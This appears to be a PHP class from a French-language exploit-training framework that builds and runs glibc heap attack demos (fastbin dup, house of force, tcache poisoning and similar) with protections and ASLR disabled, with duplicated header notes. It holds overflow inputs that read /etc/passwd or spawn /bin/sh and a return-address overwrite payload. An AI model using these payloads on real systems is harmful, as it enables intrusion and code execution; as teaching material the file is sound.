<?php

/*
 *https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/
 *https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/
 *
 * article("Conclusion","Not eXecutable Stack: Does not protect against return to libc or heap attacks.");
 *
 *
 * The heap is an area in the memory that is dynamically allocated using
 * functions: malloc(3), calloc(3).
 *
 * mtrace -> heap - malloc trace
 *
 * cat /proc/meminfo
 * KernelStack: 5760 kB
 * VmallocTotal: 34359738367 kB
 * VmallocUsed: 162016 kB
 * VmallocChunk: 34359553408 kB
 * SwapTotal: 16735228 kB
 * SwapFree: 16427424 kB
 *
 *
 * faire hijacking memcpy (faire des strace, ltrace ) pour voir les dependences du programme pour memcpy
 *
 *
 *
 * *** glibc detected *** heap: double free or corruption (!prev): 0x0804b008 ***
 * ======= Backtrace: =========
 * /lib/i386-linux-gnu/libc.so.6(+0x75ee2)[0xf7e7cee2]
 * heap[0x8048491]
 * /lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xf7e204d3]
 * heap[0x80483b1]
 *
 * export MALLOC_CHECK_=0
 * MALLOC_CHECK_ =
 * 0 Silently ignore any issues
 * 1 Send error message to stderr
 * 2 abort() is called immediately, killing your program.
 * 3 Do both '1' and '2' (MALLOC_CHECK_ is a bitfield)
 *
 * $ man malloch
 *
 * The RELRO technique (enabled by default on recent Linux distributions) marks the relocation sections used to
 * dynamically loaded functions read-only (.ctors, .dtors, .jcr, .dynamic and .got): this means that the program crashes
 * if it tries to modifies one of these sections.
 * The __do_global_dtors_aux function (which is the one executing the destructors) has been hardened in 2007 in such a way
 * that only the destructors actually defined in the code are going to be executed.
 *
 * info proc mappings -> au lieu de shell cat /proc/`pidof`/maps
 *
 ------------------------------              ------------------------------
 |              |             |            \ |              |             |
 |     DATA     |     NEXT    |--------------|     DATA     |     NEXT    |
 |              |             |            / |              |             |
 ------------------------------              ------------------------------
 
 *
 *
 https://github.com/hugsy/gef
 https://heap-exploitation.dhavalkapil.com/attacks/
 https://github.com/shellphish/how2heap
 
 * 
 *Heap Spraying (such as Management, Feng Shui & Heaplib) and Browser User-After-Free Conditions
EMET Protection (such as LoadLibrary, MemProt, Caller, SimExecFlow, StackPivot)
Code Poly/Metamorphism, Caves, Splitting, Packing, Obfuscation and/or Encryption 
 *
 *
 * faire hijacking memcpy (faire des strace, ltrace ) pour voir les dependences du programme pour memcpy
 *
 *
 *
 * *** glibc detected *** heap: double free or corruption (!prev): 0x0804b008 ***
 * ======= Backtrace: =========
 * /lib/i386-linux-gnu/libc.so.6(+0x75ee2)[0xf7e7cee2]
 * heap[0x8048491]
 * /lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xf3)[0xf7e204d3]
 * heap[0x80483b1]
 *
 * export MALLOC_CHECK_=0
 * MALLOC_CHECK_ =
 * 0 Silently ignore any issues
 * 1 Send error message to stderr
 * 2 abort() is called immediately, killing your program.
 * 3 Do both '1' and '2' (MALLOC_CHECK_ is a bitfield)
 *
 * $ man malloch
 *
 * The RELRO technique (enabled by default on recent Linux distributions) marks the relocation sections used to dynamically 
 * dynamically loaded functions read-only (.ctors, .dtors, .jcr, .dynamic and .got): this means that the program crashes 
 * if it tries to modifies one of these sections.
 * The __do_global_dtors_aux function (which is the one executing the destructors) has been hardened in 2007 in such a way 
 * that only the destructors actually defined in the code are going to be executed.
 *
 * info proc mappings -> au lieu de shell cat /proc/`pidof `/maps
 * 
 * 
 * AddressSanitizer (or ASan) is a programming tool that detects memory corruption bugs such as buffer overflows or accesses to a dangling pointer (use-after-free). 
 * AddressSanitizer is based on compiler instrumentation and directly-mapped shadow memory. 
 * AddressSanitizer is currently implemented in Clang (starting from version 3.1[1]) and GCC (starting from version 4.8[2]). 
 * On average, the instrumentation increases processing time by about 73% and memory usage by 340%
 * 
 */
// SLUB overflow
// kmalloc
//
class ret2heap4linux extends bin4linux{


	public function __construct($bin_bof) {
		parent::__construct($bin_bof);
		$name = __CLASS__;
		$rep_path = "$this->dir_tmp/$name";
		if (!file_exists($rep_path)) $this->create_folder($rep_path);
		$this->os2aslr4no();
		$this->requette("export MALLOC_CHECK_=0");
	}


//
function countermeasure_heap() {
}


public function ret2heap4linux_all(){
	$module = "Heap Overflow";
	$this->chapitre($module );
	$this->ret2heap4linux_dlmalloc() ;
	$this->article("Conclusion", "Not eXecutable Stack: Does not protect against heap attacks." );
}

// ==================== HEAP ========================================================

public function ret2heap4linux_test(){
    $this->ssTitre(__FUNCTION__);
    
    
}

public function ret2heap4linux_unlink(){
    $this->ssTitre(__FUNCTION__);
    $this->img("$this->dir_img/bof/heap_unlink.png");
    
}

public function ret2heap4linux_intro(){
    $this->ssTitre(__FUNCTION__);
    
    $name = "ret2heap4linux_fastbin_dup";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    
    
    $name = "ret2heap4linux_first_fit";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();

    
    $name = "ret2heap4linux_fastbin_dup_into_stack";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    
    
    $name = "ret2heap4linux_fastbin_dup_consolidate";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();

    
    
    $name = "ret2heap4linux_house_of_einherjar";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    $name = "ret2heap4linux_house_of_force";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    $name = "ret2heap4linux_house_of_lore";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    $name = "ret2heap4linux_house_of_orange";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    $name = "ret2heap4linux_house_of_spirit";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    $name = "ret2heap4linux_large_bin_attack";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();

    
    $name = "ret2heap4linux_overlapping_chunks";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    
    $name = "ret2heap4linux_overlapping_chunks_2";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    
    $name = "ret2heap4linux_poison_null_byte";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    
    $name = "ret2heap4linux_unsafe_unlink";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    
    $name = "ret2heap4linux_unsorted_bin_attack";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
 
    
    $name = "ret2heap4linux_unsorted_bin_into_stack";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    
    
    $name = "ret2heap4linux_tcache_dup";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    
    $name = "ret2heap4linux_tcache_house_of_spirit";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    
    $name = "ret2heap4linux_tcache_poisoning";
    $this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
    $c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
    $file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
    //$this->requette("gedit $file_c->file_path");
    $programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
    $argv = "";
    $this->requette("$programme $argv");
    $this->pause();
    
    

    
}
public function ret2heap4linux_use_afer_free(){
    $this->ssTitre(__FUNCTION__);
    
    
}
function ret2heap4linux_dlmalloc() {
	$module = "Heap Overflow";
	$this->gtitre($module);
	$this->os2aslr4no();
	$this->article("le tas(heap)", " elle contient les zones mémoires adressées par les pointeurs, les variables dynamiques.
	Lors de sa déclaration un pointeur occupe 32 bits soit dans BSS, soit dans la pile et ne pointe nulle part en particulier." );
	
	$name = "ret2heap4linux_0";
	$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
	$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
	$file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
	$this->requette("gedit $file_c->file_path");
	$programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
	$this->requette($programme );
	$file_bin = new bin4linux($programme);
	//$file_bin->elf2heap2size("AAAA");$this->pause();
	//$file_bin->elf2dll();$this->pause();
	$file_bin->elf2heap();$this->pause();


	$name = "ret2heap4linux_1";
	$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
	$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
	$file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
	
	$this->requette("gedit $file_c->file_path");
	$programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
	$this->requette($programme );
	$this->pause();

	$name = "ret2heap4linux_2";
	$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
	$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
	$file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
	
	$programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
	$this->article("Tester in name", " AAAAA | AAAAAAAAAAAAAAAAcat /etc/passwd | AAAAAAAAAAAAAAAA/bin/sh\n" );
	$this->requette("echo 'AAAAA' | $programme ");$this->pause();
	$this->requette("echo 'AAAAAAAAAAAAAAAAcat /etc/passwd' | $programme ");$this->pause();
	$this->cmd("localhost","echo 'AAAAAAAAAAAAAAAA/bin/sh' | $programme ");$this->pause();

	
	
	$name = "ret2heap4linux_malloc_ptr_addr_bss";
	$this->requette("cp -v $this->dir_c/$name.c $this->dir_tmp/$name.c");
	$c_code = file_get_contents("$this->dir_tmp/$name.c"); // -fno-pie -z norelro -z execstack -fno-stack-protector -m32 -mtune=i386 -static
	$file_c = new FILE($this->stream,"$this->dir_tmp/$name.c");
	
	$programme = $file_c->file_c2elf("-ggdb -w -fno-stack-protector -fno-pie -z execstack -z norelro -m32 -mtune=i386 -ldl");
	$this->requette($programme );

	$tmp = trim($this->req_ret_str("$programme | grep Before | cut -d'=' -f2" ));
	$this->requette("gdb -q --batch -ex \"info symbol $tmp\" $programme" );
	

	$this->pause();
	

}
// ==================== END HEAP ========================================================

public function ret2heap4linux_OffByOne(){
	/*
	 * The off-by-one heap overflow bug
	 *
	 *  SLOB chunk growth example for libplayground
	 * Copyright (c) 2012 Dan Rosenberg (@djrbliss)
	 *
	 */
}

public function ret2heap4linux_fmtstr(){
	
}

public function ret2heap4linux_malloc($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max){
    $this->ssTitre(__FUNCTION__);
    $addr = $this->elf2addr4fonction_prog("winner");
    $addr = $this->hex2rev_32($addr);
    //$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr\"+\"\\x90\"*$nops+\"$shellcode\"'";
    $cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr\"'";
    $query = "$this->file_path `$cmd`";
    $this->requette($query) ;
}


}
?>